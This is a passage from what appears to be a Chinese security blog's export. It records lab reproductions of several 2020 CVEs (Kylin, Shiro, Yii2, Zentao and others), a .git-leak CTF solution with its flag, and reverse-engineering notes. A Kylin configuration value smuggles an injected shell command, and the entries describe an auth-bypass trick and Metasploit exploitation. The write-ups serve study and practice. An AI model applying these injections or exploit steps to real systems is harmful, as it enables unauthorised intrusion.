<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109174048451.png" alt="image-20201109174048451"></p>
<p>通过查询微软官方文档理解出现的几个函数</p>
<p>我们可以理解下面的循环是，确认Address的数量，对每个Address进行处理，分配合适的内存。</p>
<p>而漏洞原因就在于v41处未对length奇偶进行判断</p>
<p>根据RFC8106的标准，Length字段的值应该满足最小为3的奇数的情况。那么当我们提供一个偶数Length值如4时，Ipv6pUpdateRDNSS()函数应该增加32字节（4*8）的缓冲区。但是此代码中，可以看到堆栈在内部以16字节为增量进行计数，当v41为1时，分配的缓冲区是v9的8字节加上v19的16字节，最终为24字节，就会导致缓冲区溢出。</p>
<p><strong>注意</strong>：如果从NetBuffer请求的数据是连续的，则会将数据存放在NDIS提供的地址，这样无法造成溢出。所以需要从NetBuffer请求的数据不是连续的，才会将数据存放在Storage上。数据非连续的实现是通过fragmentation（碎片化）处理，将Router Advertisement包通过scapy的fragment6函数拆分成多个IPv6 fragments进行发送。</p>
<p>查看复现中抓取的Router Advertisement流量包，可以看到其中length为偶数8</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109174105003.png" alt="image-20201109174105003"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>windows内核</tag>
        <tag>ipv6</tag>
      </tags>
  </entry>
  <entry>
    <title>0x06Cve-2020-1956、Cve-2020-13925复现</title>
    <url>/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="Cve-2020-1956、Cve-2020-13925复现"><a href="#Cve-2020-1956、Cve-2020-13925复现" class="headerlink" title="Cve-2020-1956、Cve-2020-13925复现"></a>Cve-2020-1956、Cve-2020-13925复现</h4><p>参考：<a href="https://paper.seebug.org/1237/">https://paper.seebug.org/1237/</a></p>
<p><a href="http://www.ijiandao.com/2b/baijia/373874.html">http://www.ijiandao.com/2b/baijia/373874.html</a></p>
<p>这两个都是Kylin下的漏洞，放在一起复现了</p>
<a id="more"></a>

<p>环境：<strong>Kylin</strong> 官网文档 <a href="http://kylin.apache.org/cn/docs/install/kylin_docker.html">http://kylin.apache.org/cn/docs/install/kylin_docker.html</a></p>
<h5 id="0x1-docker里下环境"><a href="#0x1-docker里下环境" class="headerlink" title="0x1 docker里下环境"></a>0x1 docker里下环境</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201109181510327.png" alt="image-20201109181510327"></p>
<h5 id="0x2-运行docker"><a href="#0x2-运行docker" class="headerlink" title="0x2 运行docker"></a>0x2 运行docker</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-m 8G \</span><br><span class="line">-p 7070:7070 \</span><br><span class="line">-p 8088:8088 \</span><br><span class="line">-p 50070:50070 \</span><br><span class="line">-p 8032:8032 \</span><br><span class="line">-p 8042:8042 \</span><br><span class="line">-p 16010:16010 \</span><br><span class="line">apachekylin&#x2F;apache-kylin-standalone:3.0.1</span><br></pre></td></tr></table></figure>

<p>注意：login的页面要等一会儿才能出来（一开始一直没有页面还以为是哪里有问题查了一会儿…..</p>
<h5 id="0x3-使用默认密码-admin-KYLIN-登录"><a href="#0x3-使用默认密码-admin-KYLIN-登录" class="headerlink" title="0x3 使用默认密码 admin/KYLIN 登录"></a>0x3 使用默认密码 <strong>admin/KYLIN</strong> 登录</h5><p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111136838.png" alt="image-20201021111136838"></p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111207181.png" alt="image-20201021111207181"></p>
<h5 id="0x01-Cve-2020-1956"><a href="#0x01-Cve-2020-1956" class="headerlink" title="0x01 Cve-2020-1956:"></a>0x01 Cve-2020-1956:</h5><p>0x001 修改配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kylin.tool.auuto-migrate-cube.enabled&#x3D;true</span><br><span class="line">kylin.tool.auto-migrate-cube.src-config&#x3D;&#x2F;home&#x2F;admin&#x2F;apache-kylin-3.0.1-bin-hbase1x&#x2F;conf&#x2F;kylin.propertie</span><br><span class="line">kylin.server.cluster-name&#x3D;kylin_metadata</span><br><span class="line">kylin.tool.auto-migrate-cube.dest-config&#x3D;&#x2F;tmp&#x2F;kylin.properties kylin_streaming_cube learn_kylin true true true true;touch &#x2F;tmp&#x2F;kami;echo</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021142624221.png" alt="image-20201021142624221"></p>
<p>0x002 发包，可以看到返回200</p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114530646.png" alt="image-20201021114530646"></p>
<p>0x003 进入查看（docker exec -it <CONTAINER id> bash），可以看到我们写进配置的语句被执行了，生成文件成功</CONTAINER></p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114830282.png" alt="image-20201021114830282"></p>
<h5 id="0x02-Cve-2020-13925"><a href="#0x02-Cve-2020-13925" class="headerlink" title="0x02 Cve-2020-13925:"></a>0x02 Cve-2020-13925:</h5><p>0x001 选择一个项目，点击diagnosis，抓包</p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143637495.png" alt="image-20201021143637495"></p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143717266.png" alt="image-20201021143717266"></p>
<p>0x002 改包，即可</p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021150700075.png" alt="image-20201021150700075"></p>
<p>这里有一个额外的知识：burp的collaborator模块</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>kylin</tag>
      </tags>
  </entry>
  <entry>
    <title>0x07cve-2020-13933复现</title>
    <url>/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="cve-2020-13933：Apache-shiro-权限绕过漏洞复现"><a href="#cve-2020-13933：Apache-shiro-权限绕过漏洞复现" class="headerlink" title="cve-2020-13933：Apache shiro 权限绕过漏洞复现"></a>cve-2020-13933：Apache shiro 权限绕过漏洞复现</h4><p>这个复现非常简单，先用IDEA+shiro搭环境</p>
<p>参考：<a href="https://www.cnblogs.com/ph4nt0mer/p/13535999.html">https://www.cnblogs.com/ph4nt0mer/p/13535999.html</a></p>
<a id="more"></a>

<p>然后运行，访问，抓包即可</p>
<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200923095122117.png" alt="image-20200923095122117"></p>
<p>访问test，成功</p>
<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183129207.png" alt="image-20200922183129207"></p>
<p>要越权访问test文件夹下的内容，跳转到登录界面</p>
<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183151071.png" alt="image-20200922183151071"></p>
<p>进行%3b的操作，绕过登录访问到了页面内容</p>
<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183207361.png" alt="image-20200922183207361"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>apaches shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>0x08cve-2020-15148 Yii2反序列化漏洞复现</title>
    <url>/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="cve-2020-15148-Yii2反序列化漏洞复现"><a href="#cve-2020-15148-Yii2反序列化漏洞复现" class="headerlink" title="cve-2020-15148 Yii2反序列化漏洞复现"></a>cve-2020-15148 Yii2反序列化漏洞复现</h4><p>参考：</p>
<p><a href="https://xz.aliyun.com/t/8307?page=5">https://xz.aliyun.com/t/8307?page=5</a></p>
<p><a href="https://www.cnblogs.com/2rsh0u/p/13714923.html">https://www.cnblogs.com/2rsh0u/p/13714923.html</a></p>
<a id="more"></a>

<h5 id="0x1-安装Yii2"><a href="#0x1-安装Yii2" class="headerlink" title="0x1 安装Yii2"></a>0x1 安装Yii2</h5><p>到Github上下载了对应的漏洞版本(<a href="https://github.com/yiisoft/yii2/releases),%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E4%BA%86yii-basic-app-2.0.37.tgz">https://github.com/yiisoft/yii2/releases),此处下载了yii-basic-app-2.0.37.tgz</a></p>
<p>打开文件，本来想看参考文章里的复现的，奈何win下的环境搞不好，刚好看到文件夹里有docker-compose文件，便去官方文档看了下docker的安装(<a href="https://www.yiichina.com/doc/guide/2.0/start-installation">https://www.yiichina.com/doc/guide/2.0/start-installation</a>)</p>
<p>进入对应文件夹然后启动：docker-compose up</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027150136028.png" alt="image-20201027150136028"></p>
<p>然后找到了对应的web页面访问地址</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027150317471.png" alt="image-20201027150317471"></p>
<p>这样就搭建成功了</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027133934882.png" alt="image-20201027133934882"></p>
<p>注意：要写入config文件夹中的web.php中的cookieValidationKey字段的值，不然会报错</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027152240894.png" alt="image-20201027152240894"></p>
<h5 id="0x2-漏洞复现"><a href="#0x2-漏洞复现" class="headerlink" title="0x2 漏洞复现"></a>0x2 漏洞复现</h5><p>第一次复现PHP的漏洞，还是有很多懵的地方,一开始看到这个poc和别人的复现记录我都不知道如何操作</p>
<p>poc：</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027151142665.png" alt="image-20201027151142665"></p>
<p>看到这个Php文件最后输出一个base64加密的字符串</p>
<p><strong>可以放到菜鸟的php在线工具(或者其他的Php在线编辑器：<a href="https://tool.lu/coderunner/)%E8%BF%90%E8%A1%8C%EF%BC%8C%E5%A4%8D%E5%88%B6%E7%94%9F%E6%88%90%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8D%B3%E5%8F%AF">https://tool.lu/coderunner/)运行，复制生成的字符串即可</a></strong></p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027152049055.png" alt="image-20201027152049055"></p>
<p>然后在controllers下创建一个反序列化的入口TestController.php</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027152429860.png" alt="image-20201027152429860"></p>
<p>然后抓包，改包，将字符串放进去，重新发送，即可看到POC内的攻击命令被运行了，命令可自己改</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027144713425.png" alt="image-20201027144713425"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>yii2</tag>
      </tags>
  </entry>
  <entry>
    <title>0x09CVE-2020-11113复现</title>
    <url>/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="CVE-2020-11113复现"><a href="#CVE-2020-11113复现" class="headerlink" title="CVE-2020-11113复现"></a>CVE-2020-11113复现</h4><p>复现参考：<a href="https://blog.csdn.net/mukami0621/article/details/108447493">https://blog.csdn.net/mukami0621/article/details/108447493</a></p>
<p>这两个漏洞复现方式很像…</p>
<a id="more"></a>

<p>POC:<a href="https://github.com/Al1ex/CVE-2020-11113">https://github.com/Al1ex/CVE-2020-11113</a></p>
<p>项目里已经搭好了环境，其实应该按之前复现过的24616流程，稍微改改POC内容即可</p>
<p>复现成功结果：</p>
<p><img src="/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/image-20201102140016594.png" alt="image-20201102140016594"></p>
<p>出现的问题：</p>
<p>1、有一个包无法下载</p>
<p>解决：<a href="https://mvnrepository.com,自行下载导入(虽然官网的验证蛮烦的/">https://mvnrepository.com，自行下载导入（虽然官网的验证蛮烦的</a></p>
<p>2、和24616不一样，恶意类发送了但是不知道为啥计算器弹不出来…</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>0x0ACVE-2020-8617复现</title>
    <url>/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="CVE-2020-8617复现"><a href="#CVE-2020-8617复现" class="headerlink" title="CVE-2020-8617复现"></a>CVE-2020-8617复现</h4><p>参考：<a href="https://github.com/knqyf263/CVE-2020-8617">https://github.com/knqyf263/CVE-2020-8617</a></p>
<a id="more"></a>

<p>0x1 下载docker镜像后运行（服务器环境）</p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095624465.png" alt="image-20201110095624465"></p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103142215582.png" alt="image-20201103142215582"></p>
<p>0x2 安装pipenv</p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095701235.png" alt="image-20201110095701235"></p>
<p>0x3 因为已经有pipfile.lock文件，所以运行脚本会自动安装依赖，可以看到运行脚本之后服务器就崩溃了</p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103143139388.png" alt="image-20201103143139388"></p>
<p>0x4 流量包情况</p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103145742284.png" alt="image-20201103145742284"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>pipenv</tag>
      </tags>
  </entry>
  <entry>
    <title>0x0BCve-2020-7361 禅道远程代码执行漏洞复现</title>
    <url>/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="0x0B-Cve-2020-7361-禅道远程代码执行漏洞复现"><a href="#0x0B-Cve-2020-7361-禅道远程代码执行漏洞复现" class="headerlink" title="0x0B Cve-2020-7361 禅道远程代码执行漏洞复现"></a>0x0B Cve-2020-7361 禅道远程代码执行漏洞复现</h4><p>poc：<a href="https://github.com/rapid7/metasploit-framework/pull/13828">https://github.com/rapid7/metasploit-framework/pull/13828</a></p>
<a id="more"></a>

<h5 id="0x1-准备攻击机环境"><a href="#0x1-准备攻击机环境" class="headerlink" title="0x1 准备攻击机环境"></a>0x1 准备攻击机环境</h5><p>看到这个POC，发现是加入到metasploit模块里</p>
<p>打开kali，学习了一下<strong>metasploit加入自定义模块</strong></p>
<p>​    准备好后缀为rb的文件-&gt;usr-&gt;share-&gt;metasploit-framework-&gt;modules-&gt;exploits</p>
<p>​    在里面可以自己创一个新的文件夹，也可以直接放到任意一个文件夹下</p>
<p>​    然后在终端里：msfconsole打开-&gt;reload_all即可导入模块</p>
<h5 id="0x2-准备靶机环境"><a href="#0x2-准备靶机环境" class="headerlink" title="0x2 准备靶机环境"></a>0x2 准备靶机环境</h5><p>到禅道官网下载对应版本的一键安装包：<a href="https://www.zentao.net/download.html">https://www.zentao.net/download.html</a></p>
<p>我这里下载的是8.8.1的版本，放在了D盘</p>
<p>然后在win10的环境下安装，运行（一定要解压缩在磁盘的根目录下</p>
<p>修改了端口为8099，因为80被占用了</p>
<p><img src="/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201105135400652.png" alt="image-20201105135400652"></p>
<p>点击访问之后需要修改下数据库密码，然后用admin/123456默认密码登入页面，修改密码为zentao123即可</p>
<p>靶机环境就准备好了</p>
<h5 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h5><p>查看攻击机的IP（LHOST）和靶机的IP（RHOST）并记录，同时确保攻击机和靶机能通信，即攻击机可以用http://靶机IP/pro/login.html访问到禅道的页面</p>
<p>在msf对各个参数进行设定，LHOST，RHOST，PASSWORD，RPORT</p>
<p><img src="/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201105140022697.png" alt="image-20201105140022697"></p>
<p>然后run，就可以看到打成功了，可以得到目标靶机的信息，利用meterpreter可以上传文件下载文件等等，常用命令：<a href="https://blog.csdn.net/qq_34841823/article/details/54926500">https://blog.csdn.net/qq_34841823/article/details/54926500</a></p>
<p><img src="/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201105140344931.png" alt="image-20201105140344931"></p>
<p>抓取的重点流量包：</p>
<p><img src="/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201105142158502.png" alt="image-20201105142158502"></p>
<h5 id="出现的问题："><a href="#出现的问题：" class="headerlink" title="出现的问题："></a>出现的问题：</h5><h5 id="0x01-攻击机和靶机在同一网段，能Ping通，但是无法访问对应页面"><a href="#0x01-攻击机和靶机在同一网段，能Ping通，但是无法访问对应页面" class="headerlink" title="0x01 攻击机和靶机在同一网段，能Ping通，但是无法访问对应页面"></a>0x01 攻击机和靶机在同一网段，能Ping通，但是无法访问对应页面</h5><p>解决方法：</p>
<p>是8099端口未开放的问题，在防火墙规则里添加一条自定义的入站规则即可，开放8099的权限</p>
<h5 id="0x02-POC无法打成功，原因未知，一直卡在sending-stage阶段，msf是4的版本"><a href="#0x02-POC无法打成功，原因未知，一直卡在sending-stage阶段，msf是4的版本" class="headerlink" title="0x02 POC无法打成功，原因未知，一直卡在sending stage阶段，msf是4的版本"></a>0x02 POC无法打成功，原因未知，一直卡在sending stage阶段，msf是4的版本</h5><p>解决方法：</p>
<p>重新装了一个kali2018，并且用官方更新源更新了msf到了msf6，发现zentao这个漏洞的模块已经写入了，直接利用就打成功了（计算机真是个玄学</p>
<p>​    msf更新后无法启动成功：gem install bundler:2.1.4（根据提示的版本更新</p>
<p>​    新装的Kali需要做的操作：</p>
<p>​        0x001 修改分配的运行内存，默认可能是512M，这样会很卡，修改后分配了2G</p>
<p>​        0x002 修改/etc/apt/source.list，添加更新源，官方或者其他的</p>
<p>​        0x003 修改/etc/network/interfaces ，添加语句 auto eth0和iface eth0 inet dhcp，然后重启网络/etc/init.d/networking restart</p>
<p>​        0x004 修改/etc/resolv.conf，添加语句nameserver 8.8.8.8等</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-2020.6.12</title>
    <url>/2020/06/12/CTF-2020.6.12/</url>
    <content><![CDATA[<h4 id="git文件泄露导致源码泄露"><a href="#git文件泄露导致源码泄露" class="headerlink" title=".git文件泄露导致源码泄露"></a>.git文件泄露导致源码泄露</h4><p>首先，关于git：分布式版本控制系统（版本控制：记录每次文件的改动，并支持协作编辑）</p>
<h5 id="0x1-一些用语解释："><a href="#0x1-一些用语解释：" class="headerlink" title="0x1 一些用语解释："></a>0x1 一些用语解释：</h5><a id="more"></a>

<p>集中式：全部文件存在一个中央服务器中，需联网，修改时从中央服务器中取出修改完放回去。</p>
<p>分布式：各个电脑里都有完整的版本库，修改后需推送，安全性高，可以有一个中央服务器用来方便大家交换修改的版本。</p>
<p>版本库：仓库，目录，文件的修改删除git都可跟踪</p>
<p>工作区和暂存区：工作区就是自身电脑可看到的目录，暂存区在版本库中，将工作区的文件添加到暂存区（git add），然后将暂存区的所有文件添加到master（git commit）。master也是分支，分支的作用是上传未写完的代码后不会让未写完的代码影响别人。</p>
<h5 id="0x2-泄露原理："><a href="#0x2-泄露原理：" class="headerlink" title="0x2 泄露原理："></a>0x2 泄露原理：</h5><p>源码提交到远程托管网站后，从上面把源码pull到服务器时，忘记删除git文件。利用.git文件可以恢复网站的源码，源码里可能会有数据库信息。/使用git进行版本控制，对站点自动部署，配置不当会降.git文件夹直接部署到线上环境。</p>
<p>详细解释：</p>
<p>在一个目录中初始化后，会产生一个名叫.git的隐藏文件夹（版本库）</p>
<p>当开发时采用以下流程时：</p>
<p>1.初始化仓库 , 并将仓库托管在Coding或者Github上 , 便于远程协作/备份/部署<br>2.在本地进行网站开发 , 并定时提交commit , push到远程托管网站<br>3.当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站pull到Web目录下（此时会将,git文件夹下载到服务器的web目录下）<br>4.网站正常运行</p>
<p>攻击者可以利用web目录下载Git文件夹，然后就可以利用储存的版本控制信息，完全恢复网站后台的代码和目录结构以及获取数据库信息等。</p>
<h5 id="0x3-利用："><a href="#0x3-利用：" class="headerlink" title="0x3 利用："></a>0x3 利用：</h5><p>1、githack等：同构泄露的.git文件夹下的文件，还原重建工程源代码</p>
<p>2、爬虫爬取整个git目录</p>
<h5 id="0x4-修复："><a href="#0x4-修复：" class="headerlink" title="0x4 修复："></a>0x4 修复：</h5><p>1、对.git目录的访问权限进行控制</p>
<p>2、在每次Pull后删除.git文件夹</p>
<h5 id="0x5-利用场景实践："><a href="#0x5-利用场景实践：" class="headerlink" title="0x5 利用场景实践："></a>0x5 利用场景实践：</h5><p>git_extract下载：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p>cmd命令：git_extract.py  <a href="http://xxxxx/.git/">http://xxxxx/.git/</a></p>
<p>可扫描出.git漏洞</p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612152136482.png"></p>
<p>点击后：</p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105110264.png"></p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105221000.png"></p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105306274.png"></p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612154814555.png"></p>
<p>放到beyond compare（<a href="http://www.scootersoftware.com/download.php%EF%BC%89%E9%87%8C%E5%AF%B9%E6%AF%94">http://www.scootersoftware.com/download.php）里对比</a></p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105349980.png"></p>
<p>仔细看差别：</p>
<p>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</p>
<p>提交即可</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>加密与解密笔记--更新中</title>
    <url>/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h3><a id="more"></a>

<h4 id="0x1-基础"><a href="#0x1-基础" class="headerlink" title="0x1 基础"></a>0x1 基础</h4><h5 id="0x01-大端小端"><a href="#0x01-大端小端" class="headerlink" title="0x01 大端小端"></a>0x01 大端小端</h5><p>大端：12345678h存入后还是12345678，高位字节存入低地址，依序</p>
<p>小端：12345678h存入后变为78563412，低位字节存入低地址，反序</p>
<h5 id="0x02-win-api函数"><a href="#0x02-win-api函数" class="headerlink" title="0x02 win api函数"></a>0x02 win api函数</h5><p>应用程序编程接口，相当于是一个合成了各个功能的函数库，提供应用程序运行所需要的窗口管理、内存管理等功能</p>
<p>windows应用程序-&gt;API-&gt;系统服务-&gt;硬件层</p>
<p>常用函数：</p>
<p>hmemcpy{目的数据地址，源数据地址，数据大小}：拷贝数据，当做断点</p>
<p>GetWindowsText{句柄，缓冲区地址，复制的最大字符数}：获得文本控件内容</p>
<p>GetDlgItem{句柄，控件标识}：获取指定对话框的句柄</p>
<p>GetDlgItemText{句柄，控件标识，缓冲区指针，缓冲区长度}：获取对话框文本，成功就返回文本长度</p>
<p>messageBox{父窗口句柄，消息框文本，消息框标题，消息框样式}：创建信息框</p>
<h5 id="0x03-句柄"><a href="#0x03-句柄" class="headerlink" title="0x03 句柄"></a>0x03 句柄</h5><p>相当于一个唯一的标识，通常为32位，让windows能正确引用对应的对象。当一个进程被初始化的，系统会分配句柄表，句柄值就是索引</p>
<h5 id="0x04-windows消息机制"><a href="#0x04-windows消息机制" class="headerlink" title="0x04 windows消息机制"></a>0x04 windows消息机制</h5><p>消息是给应用程序与应用程序之间、应用程序与windows系统间通信的</p>
<p>应用程序实现功能靠消息触发，靠消息响应和处理来完成</p>
<p>流程：事件发生-&gt;windows把输入的消息放入系统消息队列-&gt;拷贝到相应的应用程序队列-&gt;循环检索发给对应的应用程序窗口</p>
<p>常用函数：</p>
<p>sendMessage{目的窗口句柄，消息标识，消息的WPARAM，消息的LPARAM}</p>
<h4 id="0x2-OD动态调试"><a href="#0x2-OD动态调试" class="headerlink" title="0x2 OD动态调试"></a>0x2 OD动态调试</h4><p>虽然已经经常使用过OD，但是对其中一些面板和窗体的定义不清楚</p>
<p>（适用于已经摸索过OD软件的人</p>
<p>OD的使用:</p>
<p>L：log</p>
<p>E：executable</p>
<p>M：memory</p>
<p>T：threads</p>
<p>W：windows</p>
<p>Hhandles</p>
<p>C：CPU，默认的主窗口，绝大部分操作，包括了反汇编，信息，数据，寄存器和堆栈</p>
<p>P：patches</p>
<p>K：call stack</p>
<p>B：breakpoints</p>
<p>R：reference</p>
<p>S：source</p>
<p>反汇编窗口：</p>
<p>地址：单击地址可以跳转，再次双击可以返回</p>
<p>机器码：设置或取消无条件断点，F2</p>
<p>汇编代码：可以直接修改</p>
<p>注释：分号(;)可以加注释</p>
<p>信息窗口：</p>
<p>显示寄存器值、API函数、跳转提示等</p>
<p>数据面板：</p>
<p>十六进制显示，ctrl+G可以快速跳转到对应地址</p>
<p>寄存器面板：</p>
<p>单击鼠标右键可以切换显示寄存器的方式</p>
<p>堆栈面板：</p>
<p>显示ESP指向地址的内容，API函数和子程序等</p>
<h4 id="0x3-IDA静态调试"><a href="#0x3-IDA静态调试" class="headerlink" title="0x3 IDA静态调试"></a>0x3 IDA静态调试</h4><h4 id="0x4-解密"><a href="#0x4-解密" class="headerlink" title="0x4 解密"></a>0x4 解密</h4><h4 id="0x5-PE文件"><a href="#0x5-PE文件" class="headerlink" title="0x5 PE文件"></a>0x5 PE文件</h4><h4 id="0x6-脱壳"><a href="#0x6-脱壳" class="headerlink" title="0x6 脱壳"></a>0x6 脱壳</h4><h4 id="0x7-保护"><a href="#0x7-保护" class="headerlink" title="0x7 保护"></a>0x7 保护</h4><h4 id="0x8-PEDIY"><a href="#0x8-PEDIY" class="headerlink" title="0x8 PEDIY"></a>0x8 PEDIY</h4>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>0x0Ccve-2019-10669</title>
    <url>/2020/11/11/0x0Ccve-2019-10669/</url>
